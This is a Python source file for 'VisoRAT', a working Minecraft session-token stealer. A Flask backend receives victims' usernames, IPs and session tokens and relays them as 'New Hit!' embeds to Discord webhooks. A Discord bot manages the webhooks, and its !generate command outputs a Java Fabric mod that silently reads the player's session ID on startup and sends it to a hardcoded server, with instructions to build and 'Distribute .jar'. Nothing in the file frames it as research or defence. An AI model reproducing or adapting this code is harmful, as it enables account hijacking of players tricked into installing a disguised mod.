from flask import Flask, request, jsonify
import requests
import json
import os
import time
from datetime import datetime
import discord
from discord.ext import commands
import threading
import asyncio

app = Flask(__name__)

ip_requests = {}
seen_tokens = set()
config = None  # Global config, reloadable


def load_config():
    global config
    try:
        with open('config.json', 'r') as f:
            config = json.load(f)
        # Validate Discord section
        if 'discord' not in config:
            config['discord'] = {
                "bot_token": "YOUR_DISCORD_BOT_TOKEN_HERE",
                "admin_role_id": 0,
                "guild_id": 0
            }
            save_config()
        return config
    except FileNotFoundError:
        print("ERROR: config.json not found! Creating template...")
        default_config = {
            "security": {
                "rate_limit_seconds": 600,
                "min_token_length": 128,
                "check_duplicate_tokens": True
            },
            "endpoints": {
                "/receive": {
                    "webhooks": [
                        {
                            "url": "YOUR_DISCORD_WEBHOOK_URL_HERE",
                            "name": "Webhook 1",
                            "footer": "VisoRAT",
                            "color": 7414964,
                            "avatar_url": "https://bigrat.monster/media/bigrat.jpg"
                        },
                        {
                            "url": "YOUR_DISCORD_WEBHOOK_URL_HERE",
                            "name": "Webhook 2",
                            "footer": "VisoRAT",
                            "color": 7414964,
                            "avatar_url": "https://bigrat.monster/media/bigrat.jpg"
                        }
                    ]
                },
                "/auth": {
                    "webhooks": [
                        {
                            "url": "YOUR_DISCORD_WEBHOOK_URL_HERE",
                            "name": "Webhook 3",
                            "footer": "VisoRAT",
                            "color": 7414964,
                            "avatar_url": "https://bigrat.monster/media/bigrat.jpg"
                        }
                    ]
                }
            },
            "discord": {
                "bot_token": "YOUR_DISCORD_BOT_TOKEN_HERE",
                "admin_role_id": 0,
                "guild_id": 0
            }
        }
        with open('config.json', 'w') as f:
            json.dump(default_config, f, indent=4)
        print("Created config.json template. Please configure your webhook URLs and bot token.")
        config = default_config
        return config
    except json.JSONDecodeError:
        print("ERROR: Invalid config.json format!")
        return None


def save_config():
    global config
    if config:
        with open('config.json', 'w') as f:
            json.dump(config, f, indent=4)
        print("Config saved successfully.")


def get_client_ip():
    if request.headers.get('X-Forwarded-For'):
        ip = request.headers['X-Forwarded-For'].split(',')[0].strip()
    elif request.headers.get('X-Real-IP'):
        ip = request.headers['X-Real-IP']
    else:
        ip = request.remote_addr
    return ip


def validate_player_head(username):
    try:
        url = f"https://minotar.net/helm/{username}/100.png"
        response = requests.get(url, timeout=10)
        if response.status_code == 200:
            return url, True
        else:
            return None, False
    except Exception as e:
        print(f"Error validating player head for {username}: {e}")
        return None, False


def is_rate_limited(ip, rate_limit_seconds):
    current_time = time.time()
    if ip in ip_requests:
        last_request_time = ip_requests[ip]
        if current_time - last_request_time < rate_limit_seconds:
            return True
    ip_requests[ip] = current_time
    return False


def is_duplicate_token(token, check_duplicate):
    if not check_duplicate:
        return False
    if token in seen_tokens:
        return True
    seen_tokens.add(token)
    return False


def validate_request_data(username, token, ip, security_config):
    errors = []
    head_image_url = None

    rate_limit_seconds = security_config.get("rate_limit_seconds", 60)
    if is_rate_limited(ip, rate_limit_seconds):
        errors.append(f"Rate limited: Please wait {rate_limit_seconds} seconds between requests")

    min_token_length = security_config.get("min_token_length", 128)
    if not token or len(token) < min_token_length:
        errors.append(f"Token must be at least {min_token_length} characters long")

    if security_config.get("check_duplicate_tokens", True):
        if is_duplicate_token(token, True):
            errors.append("Duplicate token detected")

    if username:
        head_url, valid_username = validate_player_head(username)
        if not valid_username:
            errors.append("Invalid Minecraft username (player head not found)")
        else:
            head_image_url = head_url
    else:
        errors.append("Username is required")

    return errors, head_image_url


def send_to_discord_webhook(webhook_config, username, ip, token, endpoint, head_image_url=None):
    webhook_url = webhook_config.get('url')
    webhook_name = webhook_config.get('name', 'VisoRAT')
    webhook_footer = webhook_config.get('footer', 'VisoRAT')
    webhook_color = webhook_config.get('color', 7414964)
    webhook_avatar = webhook_config.get('avatar_url')

    if not webhook_url or webhook_url.startswith('YOUR_DISCORD_WEBHOOK_URL'):
        print(f"ERROR: Discord webhook URL not configured for {webhook_name}")
        return False

    try:
        description = f"""IP Address:\n```\n{ip}\n```\nUsername:\n```\n{username}\n```\nMinecraft Token:\n```\n{token}\n```"""

        embed = {
            "title": f"New Hit! - {endpoint}",
            "color": webhook_color,
            "description": description,
            "footer": {"text": webhook_footer},
            "timestamp": datetime.utcnow().isoformat()
        }

        if head_image_url:
            embed["thumbnail"] = {"url": head_image_url}

        payload = {
            "username": webhook_name,
            "embeds": [embed]
        }

        if webhook_avatar and webhook_avatar != "https://example.com/avatar.png":
            payload["avatar_url"] = webhook_avatar

        response = requests.post(
            webhook_url,
            json=payload,
            headers={'Content-Type': 'application/json'},
            timeout=10
        )

        if response.status_code in [200, 204]:
            print(f"Successfully sent data to Discord webhook: {webhook_name}")
            return True
        else:
            print(f"Failed to send to Discord webhook {webhook_name}: {response.status_code} - {response.text}")
            return False

    except Exception as e:
        print(f"Error sending to Discord webhook {webhook_name}: {e}")
        return False


def send_to_all_webhooks(endpoint_config, username, ip, token, endpoint_path, head_image_url):
    if not endpoint_config or 'webhooks' not in endpoint_config:
        print(f"No webhooks configured for endpoint: {endpoint_path}")
        return []

    webhooks = endpoint_config.get('webhooks', [])
    results = []

    for webhook_config in webhooks:
        success = send_to_discord_webhook(webhook_config, username, ip, token, endpoint_path, head_image_url)
        results.append({
            "webhook_name": webhook_config.get('name', 'Unknown'),
            "success": success
        })

    return results


def setup_endpoints():
    global config
    if config and 'endpoints' in config:
        endpoints = config.get('endpoints', {})
        security_config = config.get('security', {})

        for endpoint_path, endpoint_config in endpoints.items():
            clean_path = endpoint_path.strip('/')

            def create_endpoint_handler(config=endpoint_config, path=clean_path, security=security_config):
                def handler():
                    data = request.json

                    required_fields = ['username', 'token']
                    if not data or not all(field in data for field in required_fields):
                        return jsonify({
                            "status": "error",
                            "message": f"Missing required fields. Expected: {required_fields}",
                            "endpoint": path
                        }), 400

                    username = data.get('username')
                    token = data.get('token')
                    ip = get_client_ip()

                    print(f"Received on {path} - Username: {username}, IP: {ip}, Token length: {len(token) if token else 0}")

                    validation_errors, head_image_url = validate_request_data(username, token, ip, security)
                    if validation_errors:
                        return jsonify({
                            "status": "error",
                            "endpoint": path,
                            "errors": validation_errors
                        }), 400

                    webhook_results = send_to_all_webhooks(config, username, ip, token, path, head_image_url)

                    return jsonify({
                        "status": "success",
                        "endpoint": path,
                        "webhooks_sent": len([r for r in webhook_results if r['success']]),
                        "webhooks_total": len(webhook_results),
                        "webhook_results": webhook_results
                    }), 200
                return handler

            handler_func = create_endpoint_handler()
            app.add_url_rule(f'/{clean_path}', endpoint=f'endpoint_{clean_path}', view_func=handler_func, methods=['POST'])
            print(f"Created endpoint: /{clean_path}")


# ------------------- DISCORD BOT -------------------
intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True
intents.members = True

bot = commands.Bot(command_prefix='!', intents=intents, help_command=None)


@bot.event
async def on_ready():
    print(f"[BOT] Logged in as {bot.user} (ID: {bot.user.id})")
    print(f"[BOT] Connected to {len(bot.guilds)} guild(s)")
    # Only print once
    if hasattr(on_ready, 'printed'):
        return
    on_ready.printed = True


@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        return
    if isinstance(error, commands.MissingRequiredArgument):
        await ctx.send(f"❌ Missing arguments: `{error.param}`")
    elif isinstance(error, IndexError):
        await ctx.send("❌ Not enough webhook URLs provided. Use: `!webhook <url1> <url2> <url3>`")
    else:
        await ctx.send(f"❌ Error: `{error}`")
    print(f"[BOT ERROR] {error}")


def user_has_admin_role(member):
    admin_id = config.get("discord", {}).get("admin_role_id")
    if not admin_id or admin_id == 0:
        return True
    return any(r.id == admin_id for r in member.roles)


@bot.command(name="status")
async def status_cmd(ctx):
    print(f"[BOT] !status called by {ctx.author} in #{ctx.channel}")
    member = ctx.guild.get_member(ctx.author.id)
    if not user_has_admin_role(member):
        await ctx.send("❌ You need the admin role to use this command.")
        return

    sec = config.get("security", {})
    disc = config.get("discord", {})
    eps = config.get("endpoints", {})

    embed = discord.Embed(title="VisoRAT Status", color=0x00ff00,
                          timestamp=datetime.utcnow())
    embed.add_field(
        name="🔒 Security",
        value=f"```yaml\nRate limit: {sec.get('rate_limit_seconds', 600)}s\n"
              f"Min token: {sec.get('min_token_length', 128)} chars\n"
              f"Dupe check: {sec.get('check_duplicate_tokens', True)}\n```",
        inline=False)

    role = ctx.guild.get_role(disc.get("admin_role_id"))
    embed.add_field(name="👑 Admin Role",
                    value=f"`{disc.get('admin_role_id')}`\n"
                          f"{role.mention if role else 'Anyone'}",
                    inline=False)

    wh_text = ""
    for path, ep in eps.items():
        path_name = "📨 /receive" if path == "/receive" else "🔐 /auth"
        wh_text += f"{path_name}:\n"
        for i, wh in enumerate(ep.get("webhooks", []), 1):
            name = wh.get("name", "Unnamed")
            url = wh.get("url", "")
            status = "🟢" if not url.startswith("YOUR_") else "🔴"
            preview = url[:37] + "…" if len(url) > 37 else url
            wh_text += f"  {status} `{i}.` **{name}** → `{preview}`\n"
        wh_text += "\n"

    embed.add_field(name="🌐 Webhooks", value=wh_text or "`None configured`", inline=False)
    embed.add_field(name="📡 Endpoints",
                    value=f"```\n" + "\n".join([f"POST {p}" for p in eps.keys()]) + "\n```",
                    inline=False)

    embed.set_footer(text="VisoRAT Control Panel")
    await ctx.send(embed=embed)


@bot.command(name="webhook")
async def webhook_cmd(ctx, *args):
    print(f"[BOT] !webhook called with {len(args)} args")
    member = ctx.guild.get_member(ctx.author.id)
    if not user_has_admin_role(member):
        await ctx.send("❌ Admin role required.")
        return

    if len(args) < 3:
        embed = discord.Embed(title="❌ Invalid Usage", color=0xff0000,
                              description="**Format:** `!webhook <url1> [name1] <url2> [name2] <url3> [name3]`\n\n"
                                        "**Example:** `!webhook https://discord.com/... MyWH1 https://discord.com/... MyWH2 https://discord.com/... MyWH3`")
        await ctx.send(embed=embed)
        return

    # Parse URLs and names safely
    urls = []
    names = []
    i = 0
    while i < len(args) and len(urls) < 3:
        url = args[i]
        if url.startswith("http"):
            urls.append(url)
            i += 1
            # Optional name
            if i < len(args) and not args[i].startswith("http"):
                names.append(args[i])
                i += 1
            else:
                names.append(f"Webhook {len(urls)}")
        else:
            i += 1

    if len(urls) < 3:
        await ctx.send("❌ Need exactly 3 webhook URLs. (URLs must start with `http://` or `https://`)")
        return

    # Update config
    base_wh = {"footer": "VisoRAT", "color": 7414964, "avatar_url": "https://bigrat.monster/media/bigrat.jpg"}
    
    config["endpoints"]["/receive"]["webhooks"] = [
        {**base_wh, "url": urls[0], "name": names[0]},
        {**base_wh, "url": urls[1], "name": names[1]}
    ]
    config["endpoints"]["/auth"]["webhooks"] = [
        {**base_wh, "url": urls[2], "name": names[2]}
    ]
    
    save_config()
    
    embed = discord.Embed(title="✅ Webhooks Updated", color=0x00ff00)
    embed.add_field(name="📨 /receive", value=f"**1.** {names[0]}\n**2.** {names[1]}", inline=True)
    embed.add_field(name="🔐 /auth", value=f"**1.** {names[2]}", inline=True)
    await ctx.send(embed=embed)


@bot.command(name="role")
async def role_cmd(ctx, role_id: int):
    member = ctx.guild.get_member(ctx.author.id)
    if not user_has_admin_role(member):
        await ctx.send("❌ Admin role required.")
        return

    config["discord"]["admin_role_id"] = role_id
    save_config()
    role = ctx.guild.get_role(role_id)
    await ctx.send(f"✅ Admin role set to {role.mention if role else f'`{role_id}`'}")


@bot.command(name="generate")
async def generate_cmd(ctx):
    print(f"[BOT] !generate called by {ctx.author}")
    member = ctx.guild.get_member(ctx.author.id)
    if not user_has_admin_role(member):
        await ctx.send("❌ Admin role required.")
        return

    # Get server URL from config or use default
    server_url = config.get("server_url", "https://visorat-1-kzc9.onrender.com")
    
    # Generate the Java mod code
    mod_code = f'''package me.visoxd;

import net.fabricmc.api.ModInitializer;
import net.minecraft.client.MinecraftClient;
import me.visoxd.handlers.Minecraft;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class VisoMod implements ModInitializer {{

    @Override
    public void onInitialize() {{
        new Thread(() -> {{
            try {{
                MinecraftClient client = MinecraftClient.getInstance();
                Minecraft minecraft = new Minecraft(client);

                String username = minecraft.getUsername();
                String token = minecraft.getSessionId();

                sendToServer(username, token);

            }} catch (Exception e) {{
                e.printStackTrace();
            }}
        }}).start();
    }}

    private void sendToServer(String username, String token) {{
        try {{
            HttpURLConnection conn = (HttpURLConnection) new URL("{server_url}").openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setDoOutput(true);
            conn.setConnectTimeout(5000);
            conn.setReadTimeout(5000);

            String json = String.format(
                    "\\{{"username":"%s","token":"%s"\\}}",
                    username, token
            );

            try (OutputStream os = conn.getOutputStream()) {{
                os.write(json.getBytes());
            }}

            int responseCode = conn.getResponseCode();
            System.out.println("Server Response: " + responseCode);

        }} catch (Exception e) {{
            System.out.println("Failed to send to server: " + e.getMessage());
        }}
    }}
}}
'''

    # Create file
    filename = f"VisoMod_{int(time.time())}.java"
    with open(filename, 'w') as f:
        f.write(mod_code)
    
    # Send as attachment
    with open(filename, 'rb') as f:
        file = discord.File(f, filename=filename)
    
    embed = discord.Embed(title="🎮 Minecraft Mod Generated", color=0x00ff00,
                          description=f"**File:** `{filename}`\n"
                                     f"**Server:** `{server_url}`\n\n"
                                     f"**Instructions:**\n"
                                     f"1. Create new Fabric mod project\n"
                                     f"2. Replace `src/main/java/.../YourMod.java` with this file\n"
                                     f"3. Update `fabric.mod.json` with mod ID\n"
                                     f"4. Build with `./gradlew build`\n"
                                     f"5. Distribute `.jar`")
    
    await ctx.send(embed=embed, file=file)
    print(f"[BOT] Generated mod file for {ctx.author}")


def run_bot():
    token = config.get("discord", {}).get("bot_token")
    if not token or token.startswith("YOUR_"):
        print("[BOT] No valid bot token – skipping bot start.")
        return
    try:
        bot.run(token, log_handler=None)
    except Exception as e:
        print(f"[BOT] Failed to start: {e}")


def cleanup_old_ips():
    current_time = time.time()
    rate_limit_seconds = config.get('security', {}).get('rate_limit_seconds', 600) if config else 600
    cutoff_time = current_time - (rate_limit_seconds * 2)
    global ip_requests
    ip_requests = {ip: timestamp for ip, timestamp in ip_requests.items() if timestamp > cutoff_time}


if __name__ == '__main__':
    config = load_config()
    if config:
        setup_endpoints()

        print("\nConfigured endpoints:")
        for endpoint in config['endpoints'].keys():
            webhook_count = len(config['endpoints'][endpoint].get('webhooks', []))
            print(f"  {endpoint} -> {webhook_count} webhook(s)")

        if 'security' in config:
            security = config['security']
            print("\nSecurity settings:")
            print(f"  Rate limit: {security.get('rate_limit_seconds', 600)} seconds")
            print(f"  Min token length: {security.get('min_token_length', 128)} characters")
            print(f"  Check duplicate tokens: {security.get('check_duplicate_tokens', True)}")
            print("  Username validation: Via player head API")

        # Start Discord bot in background thread
        bot_thread = threading.Thread(target=run_bot, daemon=True)
        bot_thread.start()
        print("\nDiscord bot starting... (Use !webhook, !role, !status, !generate)")

    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, debug=True)
